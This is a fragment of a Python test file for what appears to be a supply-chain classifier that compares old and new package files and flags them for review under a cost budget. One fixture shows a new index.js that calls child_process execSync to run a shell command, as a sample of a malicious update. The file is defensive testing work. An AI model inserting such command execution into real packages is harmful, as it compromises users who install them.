    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=fresh, head=load_head("jev"))
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert result.defer_reason == ""
    assert classification_incomplete(result) is False
    assert "jev_unreadable" in result.signals
    assert "release_budget" in result.signals


def test_a_release_cost_budget_stops_the_release():
    fake = FakeClef()
    client = _client(fake, release_usd=0.0000001)
    client.head_name = "jev"
    old = {"index.js": "module.exports = 1;\n"}
    new = {"index.js": "require('child_process').execSync('id');\n"}
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=client, head=load_head("jev"))
    assert result.band == "review"
    assert "release_budget" in result.signals
    assert classification_incomplete(result) is False
    assert len(fake.requests) == 1
